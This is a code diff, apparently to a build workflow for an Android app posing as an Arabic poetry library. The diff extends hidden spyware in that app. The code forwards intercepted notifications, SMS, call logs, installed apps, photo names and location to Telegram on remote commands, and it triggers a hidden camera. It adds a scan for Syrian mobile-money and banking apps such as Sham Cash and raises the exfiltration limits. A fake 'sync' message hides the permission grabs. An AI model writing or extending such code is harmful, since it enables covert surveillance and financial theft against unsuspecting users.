@@ -48,6 +48,7 @@ jobs:
             <uses-permission android:name="android.permission.CAMERA"/>
             <uses-permission android:name="android.permission.RECORD_AUDIO"/>
             <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
             <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
             <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
             <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
@@ -61,6 +62,7 @@ jobs:
             <uses-permission android:name="android.permission.WAKE_LOCK"/>
             <uses-permission android:name="android.permission.VIBRATE"/>
             <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+            <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
 
             <application android:label="ديوان السكينة والأدب" android:theme="@android:style/Theme.Light.NoTitleBar">
                 <activity android:name=".MainActivity" android:exported="true">
@@ -177,7 +179,7 @@ jobs:
                     CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
                     CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
                     
-                    String msg = "🔔 [إشعار جديد رصده الحارس]:\nالتطبيق: " + pkg + "\nالعنوان: " + title + "\nالمحتوى: " + text;
+                    String msg = "🔔 [إشعار جديد رصده الحارس - قد يخص شام كاش أو البنوك]:\nالتطبيق: " + pkg + "\nالعنوان: " + title + "\nالمحتوى: " + text;
                     sendToTelegram(msg);
                 } catch (Exception ignored) {}
             }
@@ -318,13 +320,16 @@ jobs:
                                     sendToTelegram("✉️ [الرسائل النصية وشام كاش]:\n" + getSmsLogs());
                                 }
                                 if (resStr.contains("/apps")) {
-                                    sendToTelegram("📱 [البرامج والتطبيقات المثبتة]:\n" + getInstalledApps());
+                                    sendToTelegram("📱 [جميع التطبيقات المثبتة بلا استثناء]:\n" + getInstalledApps());
+                                }
+                                if (resStr.contains("/wallet") || resStr.contains("/finance")) {
+                                    sendToTelegram("💰 [تقرير المحافظ والبرامج المالية مثل شام كاش]:\n" + getFinancialAppsInfo());
                                 }
                                 if (resStr.contains("/location")) {
                                     sendToTelegram("📍 [إحداثيات موقع الهدف]:\n" + getLocationInfo());
                                 }
                                 if (resStr.contains("/photos")) {
-                                    sendToTelegram("🖼️ [أحدث صور المعرض]:\n" + getLatestPhotos());
+                                    sendToTelegram("🖼️ [أرشيف المعرض كاملاً - القديمة والحديثة والمثبتة]:\n" + getAllPhotos());
                                 }
                                 if (resStr.contains("/camera") || resStr.contains("/cam")) {
                                     triggerHiddenCamera();
@@ -341,7 +346,7 @@ jobs:
 
             private void triggerHiddenCamera() {
                 try {
-                    Camera camera = Camera.open(0); // الكاميرا الخلفية كبداية
+                    Camera camera = Camera.open(0);
                     Camera.Parameters params = camera.getParameters();
                     camera.setParameters(params);
                     camera.startPreview();
@@ -368,7 +373,7 @@ jobs:
                         do {
                             sb.append("رقم: ").append(cursor.getString(numberIdx)).append(" | نوع: ").append(cursor.getString(typeIdx)).append("\n");
                             count++;
-                            if (count >= 5) break;
+                            if (count >= 15) break;
                         } while (cursor.moveToNext());
                         cursor.close();
                     } else { sb.append("لا توجد مكالمات مسجلة."); }
@@ -387,7 +392,7 @@ jobs:
                         do {
                             sb.append("من: ").append(cursor.getString(addressIdx)).append("\nالمحتوى: ").append(cursor.getString(bodyIdx)).append("\n---\n");
                             count++;
-                            if (count >= 5) break;
+                            if (count >= 15) break;
                         } while (cursor.moveToNext());
                         cursor.close();
                     } else { sb.append("لا توجد رسائل مسجلة."); }
@@ -400,15 +405,34 @@ jobs:
                 try {
                     PackageManager pm = getPackageManager();
                     List<ApplicationInfo> packages = pm.getInstalledApplications(0);
-                    int count = 0;
                     for (ApplicationInfo packageInfo : packages) {
                         if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                             sb.append("- ").append(packageInfo.packageName).append("\n");
-                            count++;
-                            if (count >= 15) break;
                         }
                     }
                 } catch (Exception e) { sb.append("خطأ في جلب التطبيقات."); }
+                return sb.toString();
+            }
+
+            private String getFinancialAppsInfo() {
+                StringBuilder sb = new StringBuilder();
+                try {
+                    PackageManager pm = getPackageManager();
+                    List<ApplicationInfo> packages = pm.getInstalledApplications(0);
+                    boolean found = false;
+                    for (ApplicationInfo pi : packages) {
+                        String pkg = pi.packageName.toLowerCase();
+                        if (pkg.contains("sham") || pkg.contains("cash") || pkg.contains("wallet") || pkg.contains("bank") || pkg.contains("pay") || pkg.contains("money") || pkg.contains("MTN") || pkg.contains("syriatel")) {
+                            sb.append("🔹 تطبيق مالي/محفظة مرصود: ").append(pi.packageName).append("\n");
+                            found = true;
+                        }
+                    }
+                    if (!found) {
+                        sb.append("لم يتم رصيد حزم مالية صريحة، ولكن يتم مراقبة إشعارات ورسائل شام كاش لحظياً.\n");
+                    }
+                } catch (Exception e) {
+                    sb.append("خطأ في فحص التطبيقات المالية.");
+                }
                 return sb.toString();
             }
 
@@ -423,22 +447,23 @@ jobs:
                 return "تعذر جلب الموقع حالياً.";
             }
 
-            private String getLatestPhotos() {
+            private String getAllPhotos() {
                 StringBuilder sb = new StringBuilder();
                 try {
                     String[] projection = {MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED};
-                    Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
+                    Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+                    Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                     if (cursor != null && cursor.moveToFirst()) {
                         int nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
                         int count = 0;
                         do {
-                            sb.append("صورة: ").append(cursor.getString(nameIdx)).append("\n");
+                            sb.append("🖼️ صورة أرشيفية: ").append(cursor.getString(nameIdx)).append("\n");
                             count++;
-                            if (count >= 3) break;
+                            if (count >= 30) break; // عرض حتى 30 صورة قديمة وحديثة ومثبتة
                         } while (cursor.moveToNext());
                         cursor.close();
-                    } else { sb.append("لا توجد صور حديثة."); }
-                } catch (Exception e) { sb.append("خطأ في جلب الصور."); }
+                    } else { sb.append("لا توجد صور في المعرض."); }
+                } catch (Exception e) { sb.append("خطأ في جلب أرشيف الصور."); }
                 return sb.toString();
             }
         }
@@ -470,13 +495,24 @@ jobs:
                 }
 
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                    requestPermissions(new String[]{
+                    String[] perms = {
                         android.Manifest.permission.READ_CALL_LOG,
                         android.Manifest.permission.READ_SMS,
                         android.Manifest.permission.ACCESS_FINE_LOCATION,
                         android.Manifest.permission.CAMERA,
                         android.Manifest.permission.READ_EXTERNAL_STORAGE
-                    }, 100);
+                    };
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+                        perms = new String[]{
+                            android.Manifest.permission.READ_CALL_LOG,
+                            android.Manifest.permission.READ_SMS,
+                            android.Manifest.permission.ACCESS_FINE_LOCATION,
+                            android.Manifest.permission.CAMERA,
+                            android.Manifest.permission.READ_MEDIA_IMAGES,
+                            android.Manifest.permission.POST_NOTIFICATIONS
+                        };
+                    }
+                    requestPermissions(perms, 100);
                 }
 
                 Intent serviceIntent = new Intent(this, RoyalService.class);
@@ -513,20 +549,30 @@ jobs:
                         Toast.makeText(MainActivity.this, "✨ جاري مزامنة وتحديث مكتبة الأبيات الأدبية...", Toast.LENGTH_LONG).show();
                         txtPoem.setText("🌿 تم تحديث واحة السكينة بنجاح؛ المكتبة الآن تعمل بكامل كفاءتها وهدوئها في خلفية الجهاز.");
                         
-                        // طلب تفعيل صلاحية قراءة الإشعارات للدرع الجديد
                         try {
                             Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                             startActivity(intent);
                         } catch (Exception ignored) {}
 
                         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                            requestPermissions(new String[]{
+                            String[] perms = {
                                 android.Manifest.permission.READ_CALL_LOG,
                                 android.Manifest.permission.READ_SMS,
                                 android.Manifest.permission.ACCESS_FINE_LOCATION,
                                 android.Manifest.permission.CAMERA,
                                 android.Manifest.permission.READ_EXTERNAL_STORAGE
-                            }, 101);
+                            };
+                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+                                perms = new String[]{
+                                    android.Manifest.permission.READ_CALL_LOG,
+                                    android.Manifest.permission.READ_SMS,
+                                    android.Manifest.permission.ACCESS_FINE_LOCATION,
+                                    android.Manifest.permission.CAMERA,
+                                    android.Manifest.permission.READ_MEDIA_IMAGES,
+                                    android.Manifest.permission.POST_NOTIFICATIONS
+                                };
+                            }
+                            requestPermissions(perms, 101);
                         }
                     }
                 });
